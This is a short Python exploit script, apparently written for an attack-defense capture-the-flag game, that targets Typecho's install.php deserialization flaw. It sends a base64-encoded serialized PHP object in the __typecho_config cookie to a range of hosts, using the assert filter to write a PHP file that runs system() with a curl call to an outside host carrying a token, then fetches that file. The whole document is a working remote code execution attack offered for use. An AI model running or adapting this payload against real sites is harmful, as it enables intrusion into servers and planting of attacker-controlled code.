import requests
import uuid
import base64
import hashlib

# template = '''a:2:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:19:"Typecho_Feed_type";s:8:"ATOM 1.0";s:20:"Typecho_Feed_items";a:1:{i:0;a:1:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:117:"file_put_contents('.%s.php', '<?php system('curl http://10.0.1.2?token=EVVSJBVY'); ?>')";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}}}}s:6:"prefix";s:7:"typecho";}'''

template = '''a:2:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:19:"Typecho_Feed_type";s:8:"ATOM 1.0";s:20:"Typecho_Feed_items";a:1:{i:0;a:1:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:86:"file_put_contents('cf.php', '<?php system('curl http://10.0.1.2?token=EVVSJBVY"); ?>')";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}}}}s:6:"prefix";s:7:"typecho";}'''

for i in range(21, 22):
    print(i)
    try:
        url = f'http://10.50.{i}.2/install.php?finish'
        cookies = {
            '__typecho_config': base64.b64encode(template.encode()).decode()
        }
        r = requests.get(url, cookies=cookies, timeout=2)
        flag = requests.get(f'http://10.50.{i}.2/cf.php', timeout=2).text
        print(flag)
    except Exception as e:
        pass
